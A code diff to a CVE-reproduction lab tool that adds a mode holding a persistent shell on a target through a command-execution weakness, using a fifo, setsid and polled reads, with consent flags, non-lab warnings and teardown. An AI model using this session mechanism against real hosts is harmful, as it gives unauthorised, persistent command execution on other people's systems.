@@ -2625,16 +2625,25 @@ def _prompt_repl(address):
     sys.stderr.flush()
     cwd = ""
     while True:
-        # The prompt is chrome and goes where this file's status already goes,
-        # so stdout holds the commands' output and nothing else: a run of this
-        # mode redirected to a file is a transcript of what the target said.
-        # Which is also why this reads the line itself rather than through
-        # input(), whose prompt goes to stdout.
-        sys.stderr.write(
-            "%s %s [cd simulated] %s$ "
-            % ("NOT-THIS-LAB" if foreign else "lab", address, cwd or ".")
-        )
-        sys.stderr.flush()
+        # Two things of different natures used to share this one line. The
+        # prompt -- the `[cd simulated] <cwd>$` chrome -- is for a terminal: on a
+        # pipe there is no one to prompt and it repeated once per line is noise in
+        # the transcript an operator pastes into a report, so it is written only
+        # at a tty. The NOT-THIS-LAB marker is not chrome, it is evidence: a
+        # piped run IS that transcript, and a reader there most needs the per-line
+        # reminder that a line which does not run is this lab's route not being
+        # served, not a finding about their host. So the marker is written for a
+        # foreign address whatever stdin is -- on its own line when there is no
+        # prompt to carry it -- and not twice when the prompt already has it.
+        if sys.stdin.isatty():
+            sys.stderr.write(
+                "%s %s [cd simulated] %s$ "
+                % ("NOT-THIS-LAB" if foreign else "lab", address, cwd or ".")
+            )
+            sys.stderr.flush()
+        elif foreign:
+            sys.stderr.write("[NOT-THIS-LAB %s]\\n" % address)
+            sys.stderr.flush()
         try:
             line = sys.stdin.readline()
         except KeyboardInterrupt:
@@ -2694,6 +2703,391 @@ def _prompt_mode(argv):
         sys.stderr.write(PROMPT_IS_NOT_ONE_COMMAND)
         raise SystemExit(2)
     return _prompt_repl(rest[0])
+'''
+
+
+#: The session. CVELab's own code, driving the lab program's own command form,
+#: and emitted for exactly the labs the prompt is -- `prompt_standing` gates
+#: both, so the session asks nothing of the lab the prompt does not already ask
+#: and cannot be offered to a more dormant shape than the line-by-line prompt.
+#:
+#: It rides the same primitive the prompt rides: `_prompt_run` re-enters this
+#: file with an address and one command, which is the oracle the lower half
+#: proved. A connect-back was ruled out on measurement -- a lab build cannot
+#: reach a listener on the generating host, the archived gate's two conditions
+#: match no lab, and the archived payloads ran the shell in the foreground and
+#: froze the delivery for the life of the session. This holds the shell on the
+#: TARGET instead: a detached `tail -f fifo | sh` whose fds are off this
+#: delivery's connection. The write that sends a line and each read that polls
+#: for its output are separate, quick requests, and the wait between reads is on
+#: this side, so the product is held only for each short request and keeps
+#: answering while a line runs -- the freeze is genuinely gone, not just moved to
+#: between lines. The shell is non-interactive on purpose: one process reading
+#: the fifo keeps its own state across lines without a `-i` that on a bash
+#: `/bin/sh` echoes every line it reads back into the output.
+#:
+#: The marker is the one piece made at runtime and never written here, so the
+#: emitted text stays a pure function of (cve, plan, validator, record) and the
+#: two writers agree byte for byte: `_shell_marker` makes a one-use pair with
+#: `secrets`, the held shell is asked to echo their JOIN, and a delivery line
+#: only ever carries the halves quoted apart. A target that reflects the line
+#: it was handed reproduces the halves; only running the echo on the target
+#: concatenates them, so the join in the response is the held shell answering
+#: and not the product repeating bytes -- the transposition of the archived
+#: connect-back's two-stream check onto one rendered response.
+_POC_SHELL = '''import secrets, time
+
+SHELL_NOT_ALLOWED = (
+@@NOT_ALLOWED@@)
+
+SHELL_IS_NOT_A_COMMAND = (
+@@NOT_A_COMMAND@@)
+
+SHELL_OPENING = (
+@@OPENING@@)
+
+SHELL_FLAGS = ("--shell", "--allow-shell")
+
+#: How a delivered line is waited for: from HERE, in quick reads, not in one
+#: request that blocks on the target. A line is written and the write returns at
+#: once; then up to SHELL_READS reads, SHELL_READ_GAP seconds apart, each a short
+#: grep-and-maybe-cat, ask whether the held shell has finished. The gap is a wait
+#: on this side, so the product is held only for each read and never for the time
+#: the line runs -- which is the whole reason the shell is detached. The ceiling
+#: SHELL_READS * SHELL_READ_GAP is latency, not unavailability: past it a line is
+#: reported unfinished, and the product was free the whole wait.
+SHELL_READS = @@READS@@
+SHELL_READ_GAP = @@GAP@@
+
+
+def _shell_given(argv):
+    return "--shell" in argv[1:]
+
+
+def _shell_allowed(argv):
+    """The one flag this mode does not imply, asked for because what it does is
+    more than a request: it holds a shell open and runs line after line in it."""
+    if "--allow-shell" not in argv[1:]:
+        sys.stderr.write(SHELL_NOT_ALLOWED)
+        raise SystemExit(2)
+
+
+def _shell_marker():
+    """Two halves of a one-use marker, made here and never written into this
+    file. The held shell is asked to echo their concatenation; a delivery line
+    only carries the halves quoted apart, so a target that reflects the line it
+    was handed reproduces the halves and never their join. The join coming back
+    is the held shell having run the echo, not the product echoing the bytes."""
+    return secrets.token_hex(8), secrets.token_hex(8)
+
+
+def _shell_echo(h1, h2):
+    """A command the held shell turns into the join of two halves by running it.
+
+    The halves are single-quoted BY HAND, not through shlex.quote: a hex half
+    holds nothing shlex quotes, so shlex.quote(h1) + shlex.quote(h2) is h1 + h2
+    -- the bare join, already on the wire, with nothing for a shell to join.
+    "echo '<h1>''<h2>'" carries the halves apart; only running the echo
+    concatenates the two adjacent quoted strings, which is what lets the join in
+    the response mean the held shell answered rather than the product echoing the
+    line it was sent. The halves are hex, so they need no escaping of their own.
+    """
+    return "echo '" + h1 + "''" + h2 + "'"
+
+
+def _shell_paths(run):
+    return "/tmp/%s_in" % run, "/tmp/%s_out" % run
+
+
+def _shell_sent(address, command):
+    """One delivery: one run of the one-command form at the published address.
+
+    The same primitive the prompt rides and the differential proved --
+    `_prompt_run` re-enters this file with the address and one command, in the
+    prompt's own child env where the lab proved a remote mode -- so the session
+    asks nothing of the lab the prompt does not. Its stdout is the lab program's
+    whole answer; the caller cuts the held command's output out of it.
+    """
+    done = _prompt_run(address, command)
+    return (done.stdout if done.returncode == 0 else None), done
+
+
+def _shell_cut(sent, start, end):
+    """The held command's output, between the last start-marker and the end.
+
+    The lab program wraps the target's answer in its own JSON and status lines,
+    and the answer is the LAST place the joined markers appear, so the output is
+    what sits between the final start-marker and the end-marker after it --
+    never anything the product may have echoed of the line it was sent, which
+    carries the halves apart and so has no join for this to find.
+    """
+    if sent is None or start not in sent:
+        return None
+    rest = sent.rsplit(start, 1)[1]
+    if end not in rest:
+        return None
+    body = rest.split(end, 1)[0]
+    if body[:1] == "\\n":
+        body = body[1:]
+    if body[-1:] == "\\n":
+        body = body[:-1]
+    return body
+
+
+def _shell_start(address, run):
+    """Hold a detached shell on the target, or say which thing it needs is not
+    there -- a fact about the operator's target image and not about this lab.
+
+    The holder reads a fifo through `tail`, so the shell never reaches
+    end-of-input as each delivery opens and closes the fifo, and `setsid`
+    detaches it onto its own session so it does not hold this one delivery's
+    connection open and wedge the single-threaded product. Each piece it needs
+    is checked on the target first and the one missing is named; `$!` is the
+    holder's own pid, which `setsid` makes its process group, for the teardown
+    to kill.
+
+    Its one line of report is bracketed by the same one-use markers a delivery
+    uses, and read out with `_shell_cut`: the lab program wraps the answer in
+    its own JSON, which is full of numbers, so a process id picked out of the
+    whole of that could be a status code or a length. Between the markers there
+    is only what the holder itself echoed.
+    """
+    sa, sb = _shell_marker()
+    ea, eb = _shell_marker()
+    start, end = sa + sb, ea + eb
+    fifo, out = _shell_paths(run)
+    begin = _shell_echo(sa, sb)
+    finish = _shell_echo(ea, eb)
+    holder = (
+        "%s; "
+        "if ! command -v tail >/dev/null 2>&1; then echo CVELAB_NO_TAIL; "
+        "elif ! command -v setsid >/dev/null 2>&1; then echo CVELAB_NO_SETSID; "
+        "elif ! { mkfifo %s && : > %s; } 2>/dev/null; then echo CVELAB_NO_TMP; "
+        "else setsid sh -c 'tail -n +1 -f %s | sh >> %s 2>&1' "
+        "</dev/null >/dev/null 2>&1 & echo CVELAB_HELD $!; fi; %s"
+    ) % (begin, fifo, out, fifo, out, finish)
+    sent, done = _shell_sent(address, holder)
+    if sent is None:
+        return "failed", None, done
+    report = _shell_cut(sent, start, end)
+    if report is None:
+        return "failed", None, done
+    for cause, said in (
+        ("CVELAB_NO_TAIL", "the target image has no `tail` to hold the fifo open"),
+        ("CVELAB_NO_SETSID", "the target image has no `setsid` to detach the shell"),
+        ("CVELAB_NO_TMP", "/tmp on the target would not take the fifo and output file"),
+    ):
+        if cause in report:
+            return "cannot", said, done
+    for piece in report.replace("CVELAB_HELD", " ").split():
+        if piece.isdigit():
+            return "held", piece, done
+    return "cannot", (
+        "the holder started but named no process id, so there is nothing to hold "
+        "or to tear down"
+    ), done
+
+
+def _shell_line(address, run, line, foreign):
+    """One typed line to the held shell, and what it answered.
+
+    The write and the read are two requests, not one. The write puts a
+    start-marker, the line and an end-marker as three LINES into the fifo (so a
+    line that ends in `&` is its own statement) and returns at once; then the
+    read is polled from HERE in quick requests until the end-marker lands. That
+    is what keeps the product up while a line runs: the poll's wait is on this
+    side, so the product is held only for the write and for each short read, not
+    for the whole time the line runs in the detached shell. A poll that waited on
+    the target would hold this single-threaded product for the line's duration --
+    the freeze detaching the shell was meant to end. `cd` is real here: it runs
+    in the held shell and lasts, which is the difference from the prompt.
+    """
+    sa, sb = _shell_marker()
+    ea, eb = _shell_marker()
+    start, end = sa + sb, ea + eb
+    fifo, out = _shell_paths(run)
+    begin = _shell_echo(sa, sb)
+    finish = _shell_echo(ea, eb)
+    payload = begin + "\\n" + line + "\\n" + finish + "\\n"
+    wrote, done = _shell_sent(
+        address,
+        "printf %s > %s 2>/dev/null; echo CVELAB_SENT" % (shlex.quote(payload), fifo),
+    )
+    if wrote is None or "CVELAB_SENT" not in wrote:
+        # The write itself did not run -- the command did not reach the target.
+        _prompt_said(done, foreign)
+        return False
+    # Each read greps for the end-marker's SECOND HALF, never the join: no join
+    # may ride a delivery line, or a product that reflects the line could carry
+    # one back. `echo` writes the whole marker in one go, so the half appearing
+    # means the join is there; `_shell_cut` finds the full join in the response.
+    # The cat-and-truncate is gated on the half, so until the line is done the
+    # read returns nothing and the file keeps growing under O_APPEND (`>>`); when
+    # the half is there the held shell is idle, so the cat sees the whole line
+    # and the truncate that bounds the file does not race its writes.
+    read = "if grep -q %s %s 2>/dev/null; then cat %s; : > %s; fi" % (
+        shlex.quote(eb), out, out, out)
+    for _ in range(SHELL_READS):
+        got, done = _shell_sent(address, read)
+        if got is None:
+            _prompt_said(done, foreign)
+            return False
+        body = _shell_cut(got, start, end)
+        if body is not None:
+            sys.stdout.write(body)
+            if body and not body.endswith("\\n"):
+                sys.stdout.write("\\n")
+            sys.stdout.flush()
+            return True
+        time.sleep(SHELL_READ_GAP)
+    sys.stderr.write(
+        "[the line has not finished within %ds of polling: it may still be running\\n"
+        " in the held shell on the target, which this does not stop. Its output is\\n"
+        " left in %s there and the next line clears it; it is not shown here. The\\n"
+        " product was held only for each short read, not for the wait.]\\n"
+        % (int(SHELL_READS * SHELL_READ_GAP), out)
+    )
+    return True
+
+
+def _shell_teardown(address, run, pgid):
+    """Stop the held shell and remove its two files.
+
+    SIGKILL to the holder's process group -- `setsid` made its pid the group
+    leader -- reaches the `tail` and the held `sh`. `kill -KILL -PGID`, without
+    the `--` the target's own `sh` rejects. Then the fifo and the output file
+    are removed, and the caller says so with the paths.
+    """
+    fifo, out = _shell_paths(run)
+    stop = "kill -KILL -%s 2>/dev/null; rm -f %s %s; echo CVELAB_TORNDOWN" % (
+        pgid, fifo, out)
+    _shell_sent(address, stop)
+
+
+def _shell_repl(address):
+    """A session held on the target, and torn down whatever ends it.
+
+    The limits and the costs are printed before the first line, because the
+    shape of this mode is exactly what a terminal's shape implies and does not
+    have. The paths it will leave are named here, filled in with this run's own,
+    so the sentence an operator reads before running it is the sentence about
+    their target and not a general one.
+    """
+    run = secrets.token_hex(4)
+    fifo, out = _shell_paths(run)
+    foreign = not _loopback(_lab_host(address))
+    sys.stderr.write(
+        "%s %s --shell: a session held on the target, and not a route.\\n"
+        % (os.path.basename(sys.argv[0]), address)
+    )
+    sys.stderr.write(SHELL_OPENING)
+    if foreign:
+        _lab_target_said(sys.stderr, address)
+    sys.stderr.write(
+        "[starting: this will write %s and %s on the target and leave a shell\\n"
+        " running that reads the first and writes the second, until you leave.]\\n"
+        % (fifo, out)
+    )
+    sys.stderr.flush()
+    standing, detail, done = _shell_start(address, run)
+    if standing == "failed":
+        _prompt_said(done, foreign)
+        sys.stderr.write(
+            "[no session: the delivery that would have started the shell did not run,\\n"
+            " so nothing was written on the target and there is nothing to tear down.]\\n"
+        )
+        return 2
+    if standing == "cannot":
+        sys.stderr.write(
+            "[no session: %s. Nothing was left running on the target. This is a fact\\n"
+            " about the target's image, not about whether the weakness runs commands --\\n"
+            " the one-command form still does, and so does the prompt.]\\n" % detail
+        )
+        return 2
+    pgid = detail
+    sys.stderr.write(
+        "[held: a detached shell is running on the target as process group %s,\\n"
+        " reading %s and writing %s.]\\n" % (pgid, fifo, out)
+    )
+    sys.stderr.flush()
+    try:
+        while True:
+            # Chrome and evidence split the same way the prompt's do. The
+            # `shell$` prompt is for a terminal and withheld on a pipe, where it
+            # would be noise in the captured transcript; the opening, the
+            # held/teardown lines and the costs stay whatever stdin is. The
+            # NOT-THIS-LAB marker is evidence, not chrome, so for a foreign
+            # address it is written per line whatever stdin is -- on its own line
+            # on a pipe, and not twice when the prompt already carries it.
+            if sys.stdin.isatty():
+                sys.stderr.write(
+                    "%s %s shell$ " % ("NOT-THIS-LAB" if foreign else "lab", address)
+                )
+                sys.stderr.flush()
+            elif foreign:
+                sys.stderr.write("[NOT-THIS-LAB %s]\\n" % address)
+                sys.stderr.flush()
+            try:
+                typed = sys.stdin.readline()
+            except KeyboardInterrupt:
+                sys.stderr.write("\\n")
+                continue
+            if not typed:
+                sys.stderr.write("\\n")
+                break
+            typed = typed.strip()
+            if not typed:
+                continue
+            if typed in ("exit", "quit"):
+                break
+            try:
+                if not _shell_line(address, run, typed, foreign):
+                    # The delivery did not run. The held shell may still be up,
+                    # but the route stopped answering, so there is nothing more
+                    # to send; the teardown below still runs.
+                    break
+            except KeyboardInterrupt:
+                sys.stderr.write(
+                    "\\n[stopped waiting. The line may still be running in the held\\n"
+                    " shell on the target: this is a poll and has no signal to send.]\\n"
+                )
+            except OSError as error:
+                sys.stderr.write(
+                    "[this file could not be run again to send that line: %s]\\n" % error
+                )
+    finally:
+        _shell_teardown(address, run, pgid)
+        sys.stderr.write(
+            "[torn down: killed process group %s on the target and removed %s and\\n"
+            " %s. If the target runs no init to reap it, a spent, resource-free\\n"
+            " entry for the shell may linger until the container stops -- that too is\\n"
+            " the target's image and not this lab.]\\n" % (pgid, fifo, out)
+        )
+        sys.stderr.flush()
+    return 0
+
+
+def _shell_mode(argv):
+    """The session, and every reason there is not one.
+
+    Its own flags out, and what is left is the one argument the rest of this
+    file takes: the address. The texts it refuses on are `_lab_target`'s and the
+    prompt's, because they are the same questions about the same argument -- what
+    this adds is the flag that has to be asked for, and the refusal of a command
+    on the command line, which belongs to the one-command form.
+    """
+    _shell_allowed(argv)
+    rest = [item for item in argv[1:] if item not in SHELL_FLAGS]
+    if not rest or rest[0].startswith("-"):
+        sys.stderr.write(LAB_TARGET_IS_NOT_AN_ADDRESS)
+        raise SystemExit(2)
+    if any(item == "--input" or item.startswith("--input=") for item in rest[1:]):
+        sys.stderr.write(LAB_TARGET_TAKES_NO_INPUT)
+        raise SystemExit(2)
+    if len(rest) > 1:
+        sys.stderr.write(SHELL_IS_NOT_A_COMMAND)
+        raise SystemExit(2)
+    return _shell_repl(rest[0])
 '''
 
 
@@ -2787,9 +3181,12 @@ _PROMPT_IN_HELP = (
     "what one address reaches. The other is the lab program -- with no argument at "
     "all it runs this lab's own differential, and with --prompt --allow-prompt after "
     "an address it reads commands one line at a time and runs its one-command form "
-    "once per line against that address. Nothing is held open between lines. The "
-    "prompt is not remote mode and carries no claim about any host; this file's own "
-    "docstring says what each of the two is worth."
+    "once per line against that address. Nothing is held open between lines. With "
+    "--shell --allow-shell instead, it holds a shell open on that address and runs "
+    "the lines you type in it one after another -- a session, whose state is real "
+    "and on the target, torn down when you leave. Neither the prompt nor the session "
+    "is remote mode, and neither carries a claim about any host; this file's own "
+    "docstring says what each of the two programs is worth."
 )
 
 
@@ -2833,6 +3230,44 @@ _PROMPT_IS_NOT_ONE_COMMAND = (
     "command and exits, and is what a demonstration in front of someone watching "
     "uses. --prompt asks for the commands a line at a time instead and runs each one "
     "through that same form. Drop whichever of the two you did not mean."
+)
+
+
+#: One source of truth for how a line is polled for: the number of reads and the
+#: wait between them, so the emitted constants, the ceiling the artifact quotes in
+#: its own prose, and the ceiling in LAB-POC.md cannot drift. The product is held
+#: only for each read, so the ceiling is latency and not unavailability.
+#:
+#: `_SHELL_CEILING` is the ~12s GUIDE.md quotes plainly as the session's ceiling;
+#: if these change, that sentence in the guide is what to update by hand (the
+#: guide cites no private name, so nothing there moves on its own).
+_SHELL_READS = 60
+_SHELL_READ_GAP = 0.2
+_SHELL_CEILING = int(_SHELL_READS * _SHELL_READ_GAP)
+
+#: Refused rather than reported as nothing found, on the same pattern as
+#: `--allow-prompt`: the session asks more of what it is pointed at than any
+#: single request, because it holds a shell open there and runs line after line
+#: in it. So it is the one flag of its own this mode has, and the refusal is the
+#: caller's, because what is asked for is what the operator has to agree to.
+_SHELL_NOT_ALLOWED = (
+    "--shell holds a shell open on the address you gave and runs every line you type "
+    "in it, one after another, through the weakness this lab's differential proved -- "
+    "and it writes two files on the target and leaves a process running until you "
+    "leave. That is more than any other mode here asks of what it is pointed at. "
+    "Re-run with --allow-shell once you are on a host where that is acceptable and you "
+    "are permitted to do it."
+)
+
+#: The same shape as the prompt refusing a command on the command line: which
+#: of the two the person meant decides what runs, and guessing runs the wrong
+#: one. A command on the line is the one-command form; --shell is the session.
+_SHELL_IS_NOT_A_COMMAND = (
+    "--shell and a command on the command line are different jobs. A command there is "
+    "the one-command form -- one address, then one command -- which runs that one "
+    "command and exits. --shell holds a shell open and runs the commands you type in "
+    "it a line at a time, keeping what each one did. Drop whichever of the two you did "
+    "not mean."
 )
 
 
@@ -2974,10 +3409,83 @@ def _prompt_opening(plan: dict[str, Any] | None) -> str:
             "shows `.` for whatever directory the weakness itself runs in, and `cd` "
             "with no argument returns to it."
         )
+        + "\n\n"
+        + _filled(
+            "Each line is one synchronous request: the product runs your command and "
+            "is busy until it returns, so a slow command holds it for that long, up to "
+            "the lab program's own connection timeout, after which the line comes back "
+            "as not run. That is the plain shape of a one-command form; the session "
+            "mode does its waiting at your end instead, to keep the product answering "
+            "while a line runs."
+        )
         + "\n\nWHERE YOU ACTUALLY ARE\n\n"
         + _prompt_where_you_are(plan)
         + "\n"
         + _filled("Ctrl-D, `exit` or `quit` leaves.")
+        + "\n\n"
+    )
+
+
+def _shell_opening(plan: dict[str, Any] | None) -> str:
+    """What the session says about itself before the first line is typed.
+
+    The three costs that are the whole reason this mode had to be built
+    carefully rather than as a connect-back, each said where the operator reads
+    it before they run anything: it is a session and not a route (said in the
+    same breath as the word), it leaves a process and two files on the target
+    (so there is a teardown, and the paths are named -- here generically, and at
+    the prompt with the run's own paths filled in), and it is a poll and not a
+    stream (a session with persistent state, not a terminal over a socket).
+    """
+    return (
+        "\n"
+        + _filled(
+            "This is a session. A shell is held open on the target and your lines run "
+            "in it one after another, so a variable you export, a `cd`, a key you "
+            "unlock on one line is still there on the next -- the state is real and it "
+            "is on the target, not tracked here. It is a session and not a route: it "
+            "exists only because this lab's weakness carries it, so it proves exactly "
+            "what the weakness proves and nothing at all about reaching that host any "
+            "other way."
+        )
+        + "\n\n"
+        + _filled(
+            "Holding it writes two files on the target -- a fifo the shell reads and a "
+            "file it writes -- and leaves a detached process running until you leave. "
+            "That is the cost the prompt does not have, so leaving tears it down: the "
+            "held shell is killed and both files are removed, and this says so. The two "
+            "paths are printed before the first line and again at teardown, named so "
+            "you can audit them yourself."
+        )
+        + "\n\n"
+        + _filled(
+            "It is a poll and not a stream. A line is written and then read back in "
+            "quick requests until the held shell has finished it, so it is a session "
+            "with persistent state on the target, not a terminal over a socket. Because "
+            "the waiting is done here and not on the target, the product is held only "
+            "for each short read and keeps answering everyone else while your line runs "
+            "-- a line that takes ten seconds does not take the target down for ten "
+            "seconds, which a single blocking request would. What that costs instead is "
+            f"latency and a ceiling: after about {_SHELL_CEILING} seconds a line is "
+            "reported unfinished, though it may still be running on the target, which "
+            "this cannot stop. So a command that waits for input -- an editor, a pager, "
+            "a password prompt -- is a line you wait out to that ceiling with nothing "
+            "here to type into it, and there is no job control over a line once it has "
+            "been sent."
+        )
+        + "\n\n"
+        + _filled(
+            "Each line's output is bracketed by a one-use random marker the held shell "
+            "is asked to echo, and the read ends at it. The marker is made when you "
+            "run this and is never in this file; the shell is handed its two halves "
+            "quoted apart and only prints their join by running the echo, so the join "
+            "coming back is the held shell having answered and not this product "
+            "repeating the bytes it was sent."
+        )
+        + "\n\nWHERE YOU ACTUALLY ARE\n\n"
+        + _prompt_where_you_are(plan)
+        + "\n"
+        + _filled("Ctrl-D, `exit` or `quit` leaves, and tears the session down.")
         + "\n\n"
     )
 
@@ -3195,11 +3703,36 @@ def _prompt_child_block() -> str:
     )
 
 
+def _shell_block(plan: dict[str, Any] | None) -> str:
+    """The session's own code, with this lab's words about this lab in it.
+
+    It takes no `proved` flag: the delivery is `_prompt_run`, whose child env is
+    decided in the prompt's own block, so the session needs no channel of its
+    own. It is emitted beside the prompt and never without it, because
+    `prompt_standing` gates both -- which is what makes the session structurally
+    unable to reach a lab the prompt did not.
+    """
+    return (
+        _POC_SHELL
+        .replace("@@NOT_ALLOWED@@", _python_text(_filled(_SHELL_NOT_ALLOWED, width=76)))
+        .replace(
+            "@@NOT_A_COMMAND@@",
+            _python_text(_filled(_SHELL_IS_NOT_A_COMMAND, width=76)),
+        )
+        .replace("@@OPENING@@", _python_text(_shell_opening(plan)))
+        .replace("@@READS@@", repr(_SHELL_READS))
+        .replace("@@GAP@@", repr(_SHELL_READ_GAP))
+    )
+
+
 #: The modes that are CVELab's own rather than either program's: the name
 #: `emit_poc` asks for, the predicate that spots it in argv, and the function
 #: that takes the run. A mode is one entry here and one block above it, and
-#: the dispatch below does not change.
+#: the dispatch below does not change. The session is checked before the prompt,
+#: so a run carrying both flags is a session; neither can be reached with no
+#: argument at all, which is what keeps lab mode what it was.
 _POC_OWN_MODES = (
+    ("shell", "_shell_given", "_shell_mode"),
     ("prompt", "_prompt_given", "_prompt_mode"),
 )
 
@@ -3857,6 +4390,27 @@ def _lab_mode_note(
                     )
                 )
                 + "\n\n"
+                + f"    python3 {POC_NAME} 127.0.0.1:32768 --shell --allow-shell\n"
+                + "\n"
+                + _filled(
+                    "A session, and still not a route. The same delivery, but a shell "
+                    "is held open on the target and your lines run in it one after "
+                    "another, so an export or a `cd` on one line is still there on the "
+                    "next -- real state, and on the target. It exists only because the "
+                    "weakness carries it, so it proves what the weakness proves and "
+                    "nothing about reaching that host any other way. Holding it writes "
+                    "two files on the target and leaves a process running until you "
+                    "leave, so it tears that down when you do and names the two paths "
+                    "before the first line; it asks for --allow-shell because that is "
+                    "more than any other mode here does. The shell is detached and the "
+                    "waiting is done at your end, so while a line runs the product is "
+                    "held only for each short read and keeps answering -- a slow line "
+                    "does not take the target down for its duration -- but after about "
+                    f"{_SHELL_CEILING} seconds a line is reported unfinished though it "
+                    "may still be running there. The session says all of this again, "
+                    "with the two paths, before the first line."
+                )
+                + "\n\n"
                 + _quotable(_prompt_where_you_are(plan))
             )
         elif reason:
@@ -4111,10 +4665,17 @@ def emit_poc(
             # parent's half, the child's half, and the one sentence this
             # shape changes in the block above.
             remote += "\n" + _prompt_child_block()
+        # The session rides the prompt's delivery, so it is emitted beside it
+        # and never without it -- `prompt_standing` gates both, which is what
+        # keeps the session from reaching a lab the prompt did not.
+        remote += "\n" + _shell_block(plan)
     remote += _poc_entry(
         standing,
         takes_address,
-        tuple(name for name, given in (("prompt", prompt[0]),) if given),
+        tuple(
+            name for name, given in (("shell", prompt[0]), ("prompt", prompt[0]))
+            if given
+        ),
     )
     upper = "#!/usr/bin/env python3\n" + header + hoisted + "\n" + remote + "\n"
     # Only the half CVELab wrote. The lower half is this lab's own validator
@@ -4729,7 +5290,7 @@ def prove_manual_poc(
                 "shipped": False,
                 "spec_at_fault": True,
                 "reason": f"{spec['strategy']} has no control of its own, and this lab has "
-                          f"no fixed build to supply one; use one of "
+                          "no fixed build to supply one; use one of "
                           f"{', '.join(SELF_CONTROLLED)}",
             }
         image = sidecar.ensure_image({spec.get("transport", "http")}, assume_yes)
